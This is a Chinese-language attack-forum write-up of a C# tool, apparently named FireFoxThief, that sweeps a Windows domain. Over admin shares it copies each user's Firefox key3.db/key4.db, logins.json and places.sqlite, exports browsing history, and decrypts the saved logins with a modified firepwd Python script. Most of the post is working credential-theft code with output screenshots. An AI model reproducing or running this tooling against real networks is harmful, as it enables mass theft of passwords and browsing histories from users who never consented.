> Firefox 版本 &lt;32 (key3.db, signons.sqlite)  
> Firefox 版本 &gt;=32 (key3.db, logins.json)  
> Firefox 版本 &gt;=58.0.2 (key4.db, logins.json)  
> Firefox 版本 &gt;=75.0 (sha1 pbkdf2 sha256 aes256 cbc used by key4.db, logins.json)

0x01 前置
=======

firefox配置记录在`%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\`，其中X为8位随机符，后面有可能跟了一些字符。

在域内批量导出firefox浏览器配置文件，然后改了下firepwd自动化读取文件。

firefox版本小于32没写，如果需要可以自行在代码里面添加如下代码。

```php
string firefox_signons = "signons.sqlite";
string firefox_signons_path = FindFile(ProfilePathss, firefox_signons);
if (firefox_signons_path != "")
{
    Console.ForegroundColor = ConsoleColor.Green;
    Console.WriteLine("[+]" + firefox_signons_path);
    Console.WriteLine("[*]version > 58.0.2");
    Console.ForegroundColor = ConsoleColor.White;
    //copy file
    string signons_file_path_cuurent = UserFolder + "\\" + firefox_signons;
    StreamWriter signons_file_cuurent = File.CreateText(signons_file_path_cuurent);
    signons_file_cuurent.Close();
    bool isrewrite = true;
    File.Copy(firefox_signons_path, signons_file_path_cuurent, isrewrite);
}
```

0x02 批量判断
=========

首先读取machine.txt然后判断是否存活接着批量判断是否存在配置文件，然后在本地创建机器名用户名以及对应的配置文件。

1.存活判断(面向百度)

```php
public static bool IsMachineUp(string hostName)
{
    bool retVal = false;
    try
    {
        Ping pingSender = new Ping();
        PingOptions options = new PingOptions();
        // Use the default Ttl value which is 128,
        // but change the fragmentation behavior.
        options.DontFragment = true;
        // Create a buffer of 32 bytes of data to be transmitted.
        string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        byte[] buffer = Encoding.ASCII.GetBytes(data);
        int timeout = 800;

        PingReply reply = pingSender.Send(hostName, timeout, buffer, options);
        if (reply.Status == IPStatus.Success)
        {
            retVal = true;
        }
    }
    catch (Exception ex)
    {
        retVal = false;
        //Console.ForegroundColor = ConsoleColor.Red;
        //Console.WriteLine("[-]" + ex.Message);
        //Console.ForegroundColor = ConsoleColor.White;
    }
    return retVal;
}
```

读取machine.txt然后丢给IsMachineUp方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-83b642dd13750c011e2e77c4761c8dee2cc9a908.png)

如果机器存活，在本机创建FireFoxInfo目录

```php
string currentpath = Directory.GetCurrentDirectory();
FireFoxInfo = currentpath + "\\FireFoxInfo";
Directory.CreateDirectory(FireFoxInfo);
Console.ForegroundColor = ConsoleColor.Red;
Console.WriteLine("[*]" + machine);
Console.ForegroundColor = ConsoleColor.White;
```

然后获取`c:\users\`目录下的用户目录再判断firefox配置文件是否存在与改用户目录，如果存在则在本地继续创建对应的用户目录，方便于区分

```php
string userpath = @"\\" + machine + @"\c$\users";
var user_list = Directory.EnumerateDirectories(userpath);
foreach (string user in user_list)
{
    string username = substring(user);
    string ProfilePathss = user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
    if (Directory.Exists(ProfilePathss))
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[*]" + user);
        Console.ForegroundColor = ConsoleColor.White;
        //create machine directory
        string MachineFolder = FireFoxInfo + "\\" + machine;
        Directory.CreateDirectory(MachineFolder);
        //create user direcotry
        string UserFolder = MachineFolder + "\\" + username;
        Directory.CreateDirectory(UserFolder);
```

接下来我们需要判断是否存在一下文件

> Firefox 版本 &lt;32 (key3.db, signons.sqlite)  
> Firefox 版本 &gt;=32 (key3.db, logins.json)  
> Firefox 版本 &gt;=58.0.2 (key4.db, logins.json)  
> Firefox 版本 &gt;=75.0 (sha1 pbkdf2 sha256 aes256 cbc used by key4.db, logins.json)

```php
string old_firefox_key = "key3.db";
string firefox_key = "key4.db";
string firefox_json = "logins.json";
string firefox_cookie = "places.sqlite";
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c2857eff96780b4348ea4f487d3dd3b467729b45.png)

跟到FindFile方法。

```php
public static string FindFile(string filePath, string fileName)
{
    string returnstr = "";
    DirectoryInfo[] dateDirArr = new DirectoryInfo(filePath).GetDirectories();
    foreach (DirectoryInfo directoryInfo in dateDirArr)
    {
        //Console.WriteLine(directoryInfo);
        string Directoryfullpath = filePath + "\\" + directoryInfo;
        string Filefullpath = Directoryfullpath + "\\" + fileName;
        if (!File.Exists(Filefullpath))
        {
            FindFile(Directoryfullpath, fileName);
        }
        else
        {
            returnstr =  Filefullpath;
        }
    }
    return returnstr;
}
```

遍历目录以及子目录，如果存在则返回全路径，反正返回空。

0x03 历史记录
=========

历史记录存在与places.sqlite库的moz\_places表里面

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-0581d7bbaa2d6c1d70611687b9cbf60ac259e0c3.png)

所以我们在当前用户目录创建文件夹然后创建history.txt记录值,不要忘记关闭打开的sqlite数据库。

```php
if (firefox_cookie_path != "")
{
    //copy
    string cookie_path_current = UserFolder + "\\" + firefox_cookie;
    StreamWriter cookue_file_cuurent = File.CreateText(cookie_path_current);
    cookue_file_cuurent.Close();

    bool isrewrite = true;
    File.Copy(firefox_cookie_path, cookie_path_current, isrewrite);
    SQLiteConnection connect = new SQLiteConnection(@"Data Source=" + cookie_path_current);
    connect.Open();
    string sql = "select  * from moz_places";
    SQLiteCommand command = new SQLiteCommand(sql, connect);
    command.CommandType = CommandType.Text;
    SQLiteDataReader r = command.ExecuteReader();
    string gethistorypath = UserFolder + "\\history.txt";
    StreamWriter history = File.CreateText(gethistorypath);
    history.Close();
    string HistoryMemberof = "user:" + username + "\r\n\r\n";
    File.AppendAllText(gethistorypath, HistoryMemberof);
    while (r.Read())
    {

        string url = Convert.ToString(r["url"]);
        string title = Convert.ToString(r["title"]);
        string description = Convert.ToString(r["description"]);;
        string out_string = "url:"+url + "\r\n" + "title:"+title + "\r\n";
        File.AppendAllText(gethistorypath, out_string);
    }
    connect.Close();

}
```

0x04 下载db和json
==============

同理直接下载json文件和db文件。我们可以打开看看logins.json文件内容。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-092904be828abed2c786bd07d8afd07ecd5716d6.png)

这里引用文章：<https://www.cnblogs.com/unicodeSec/p/14875364.html>

```php
Firefox 版本 >= 58.0.2 < 75
根据上述的描述，解密Firefox存储在本地的登录信息需要以下步骤：
找到当前计算机Firefox的profile目录，检查key4.db和logins.json文件是否存在。
如果存在，从key4.db中提取已编码+加密的password-check数据，先ASN1解码然后使用3DES解密被加密的password-check字符串（这样做是为了确认提取的密码是否正确）。
从key4.db中提取编码的+加密的主密钥 ，ASN.1解码，然后3DES解密主密钥。
从logins.json中读取加密的登录名和密码，ASN.1解码，然后3DES使用主密钥解密登录数据
Firefox 版本 >= 75
和Firefox 版本 >= 58.0.2 < 75不同的是，在加密password-check数据和主密钥使用了hmacWithSHA256的哈希算法和AES256 cbc的加密算法，所以解密步骤如下所示：

根据上述的描述，解密Firefox存储在本地的登录信息需要以下步骤：
找到当前计算机Firefox的profile目录，检查key4.db和logins.json文件是否存在。
如果存在，从key4.db中提取已编码+加密的password-check数据，先ASN1解码然后使用AES解密被加密的password-check字符串（这样做是为了确认提取的密码是否正确）。
从key4.db中提取编码的+加密的主密钥 ，ASN.1解码，然后3DES解密主密钥。
从logins.json中读取加密的登录名和密码，ASN.1解码，然后3DES使用主密钥解密登录数据
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c51fc46bc003f63e846d0450d8db739aa3fbba8a.png)

```php
if (firefox_json_path != "" && firefox_key_path != "")
{
    Console.ForegroundColor = ConsoleColor.Green;
    Console.WriteLine("[+]" + firefox_key_path);
    Console.WriteLine("[+]" + firefox_json_path);
    Console.WriteLine("[*]version >= 58.0.2");
    Console.ForegroundColor = ConsoleColor.White;
    //copy file
    string json_file_path_cuurent = UserFolder + "\\" + firefox_json;
    StreamWriter json_file_cuurent = File.CreateText(json_file_path_cuurent);
    json_file_cuurent.Close();

    bool isrewrite = true;
    File.Copy(firefox_json_path, json_file_path_cuurent, isrewrite);

    string firefox_key_path_cuurent = UserFolder + "\\" + firefox_key;
    StreamWriter firefox_key_cuurent = File.CreateText(firefox_key_path_cuurent);
    firefox_key_cuurent.Close();
    File.Copy(firefox_key_path, firefox_key_path_cuurent, isrewrite);
}
if (firefox_json_path != "" && firefox_old_key_path != "")
{
    Console.ForegroundColor = ConsoleColor.Green;
    Console.WriteLine("[+]" + firefox_old_key_path);
    Console.WriteLine("[+]" + firefox_old_key_path);
    Console.WriteLine("[*]version > 58.0.2");
    Console.ForegroundColor = ConsoleColor.White;
    //copy file
    string json_file_path_cuurent = UserFolder + "\\" + firefox_json;
    StreamWriter json_file_cuurent = File.CreateText(json_file_path_cuurent);
    json_file_cuurent.Close();
    bool isrewrite = true;
    File.Copy(firefox_json_path, json_file_path_cuurent, isrewrite);

    string firefox_key_path_cuurent = UserFolder + "\\" + old_firefox_key;
    StreamWriter firefox_key_cuurent = File.CreateText(firefox_key_path_cuurent);
    firefox_key_cuurent.Close();
    File.Copy(firefox_old_key_path, firefox_key_path_cuurent, isrewrite);
}
```

执行效果

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-9013b620229622f5230fc2781bcf646803f6bdf7.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8eb23b002a57c5ce214ee33a8ccb86bd56cbdd1d.png)

0x05 解析密码
=========

这里改的firepwd来自动解析我们的FireFoxInfo文件夹。修改下传参即可

```php
target_path = []
dir = "C:\\Users\\Administrator\\Desktop\\c#\\FireFoxThief\\FireFoxThief\\FireFoxThief\\bin\\Release\\FireFoxInfo\\"
for root, dirs, files in os.walk(dir):
    for file in files:
        path = os.path.join(root,file)
        if("logins.json" in os.path.join(root,file)):
            path = path.replace("logins.json","")
            target_path.append(path)

for i in target_path:
  print(i)
  key, algo = getKey(  options.masterPassword.encode(), Path(i) )
  if key==None:
    sys.exit()
  #print(hexlify(key))
  logins = getLoginData(i)
  if len(logins)==0:
    print ('no stored passwords')
  else:
    print ('decrypting login/password pairs' )
  if algo == '1.2.840.113549.1.12.5.1.3' or algo == '1.2.840.113549.1.5.13':  
    for i in logins:
      assert i[0][0] == CKA_ID
      print ('%20s:' % (i[2]),end='')  #site URL
      iv = i[0][1]
      ciphertext = i[0][2] 
      print ( unpad( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext),8 ), end=',')
      iv = i[1][1]
      ciphertext = i[1][2] 
      print ( unpad( DES3.new( key, DES3.MODE_CBC, iv).decrypt(ciphertext),8 ) )
      print("\r\n")
```

最后效果。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-73d1703d169fdd99a677022b3f6cae98368d6239.png)